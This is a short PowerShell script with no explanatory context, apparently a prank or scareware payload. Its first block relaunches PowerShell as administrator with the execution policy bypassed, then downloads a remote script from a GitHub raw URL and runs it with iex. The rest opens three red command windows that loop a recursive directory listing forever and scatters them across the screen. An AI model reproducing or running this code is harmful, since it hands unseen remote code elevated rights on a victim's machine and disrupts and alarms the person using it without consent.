if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iwr https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/lio.ps1 -UseBasicParsing | iex`""
    exit
}

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
}
"@

for ($i = 1; $i -le 3; $i++) {
    $process = Start-Process cmd -ArgumentList "/k color 4 & for /l %x in (0,0,1) do dir /s" -PassThru

    Start-Sleep -Milliseconds 500

    $hwnd = $process.MainWindowHandle

    $rand = Get-Random -Minimum 0 -Maximum 1000
    $randY = Get-Random -Minimum 0 -Maximum 600
    [WinAPI]::MoveWindow($hwnd, $rand, $randY, 800, 600, $true)
}
